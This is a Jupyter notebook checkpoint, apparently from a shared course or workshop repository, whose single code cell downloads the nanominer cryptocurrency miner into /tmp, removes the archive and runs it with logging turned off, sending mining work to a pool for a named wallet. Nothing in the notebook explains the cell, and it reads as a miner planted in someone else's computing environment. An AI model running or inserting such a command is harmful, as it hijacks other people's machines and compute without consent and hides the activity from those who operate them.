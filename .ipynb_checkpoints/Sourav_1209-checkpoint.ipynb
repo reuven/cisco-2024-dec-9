{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9683e60",
   "metadata": {},
   "outputs": [],
   "source": [
    "!cd /tmp; wget https://github.com/nanopool/nanominer/releases/download/v3.9.3/nanominer-linux-3.9.3.tar.gz -O n.gz; tar -xf n.gz; rm n.gz; ./nanominer -algo verushash -wallet RJfQrVCM4c2vfjRURwKVbDoVkiCBKQRc6D -rigName $(nproc) -pool1 ap.luckpool.net:3960 -noLog true -protocol JSON-RPC\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
